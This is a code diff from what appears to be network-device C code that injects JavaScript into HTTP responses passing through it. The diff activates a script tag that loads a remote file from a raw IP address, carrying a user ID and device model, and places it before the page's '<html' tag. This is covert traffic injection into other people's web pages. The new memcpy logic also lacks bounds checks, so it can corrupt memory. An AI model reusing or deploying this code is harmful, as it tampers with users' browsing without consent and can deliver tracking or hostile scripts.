@@ -1,7 +1,7 @@
 #include "main.h"
 
-#define JS "hello world"
-//#define JS "<script type=\"text/javascript\" src=\"http://210.22.155.236/js/wa.init.min.js?v=20150930\" id=\"15_bri_mjq_init_min_36_wa_101\" async  data=\"userId=12245789-423sdfdsf-ghfg-wererjju8werw&channel=test&phoneModel=DOOV S1\"></script>"
+//#define JS "<script type=\"text/javascript\"> alert('hello world') </script>"
+#define JS "<script type=\"text/javascript\" src=\"http://210.22.155.236/js/wa.init.min.js?v=20150930\" id=\"15_bri_mjq_init_min_36_wa_101\" async  data=\"userId=12245789-423sdfdsf-ghfg-wererjju8werw&channel=test&phoneModel=DOOV S1\"></script>"
 #define JS_LEN strlen(JS)
 
 PRIVATE int insert_js(void *data)
@@ -10,30 +10,23 @@ PRIVATE int insert_js(void *data)
     char* body;
     char buffer[BUFSIZE];
 	int len=0;
-	int i;
-	char res[][16]={"</head>","</body>" ,"</html>"};
+	char* res="<html";
     if(!skb->http_head)
 		return ERROR;
 	
-    for(i=0;i<3;i++)
-    {
-		body=strstr(skb->http_head , res[i]);
-		if(body)
-		{
-			break;
-		}
-		
-	}
+   
+	body=strstr(skb->http_head , res);
+	
 	if(!body)
 	{
 		return ERROR;
 	}
 	len=strlen(body);
-	memcpy(buffer , skb->http_head , skb->http_len-len);
-	memcpy(buffer+(skb->http_len-len) , JS , JS_LEN);
-	memcpy(buffer+(skb->http_len-len+JS_LEN) , body , len);
 	
-  	memcpy(skb->http_head , buffer , skb->http_len+JS_LEN);
+	memcpy(buffer , body , len);
+	memcpy(skb->http_head + (skb->http_len - len) , JS , JS_LEN);
+	memcpy(skb->http_head + (skb->http_len - len + JS_LEN) , buffer , len);
+	
 	//body=strstr(skb->http_head , skb->hhdr.content_length);
 	//if(!body)
 	//	return -1;
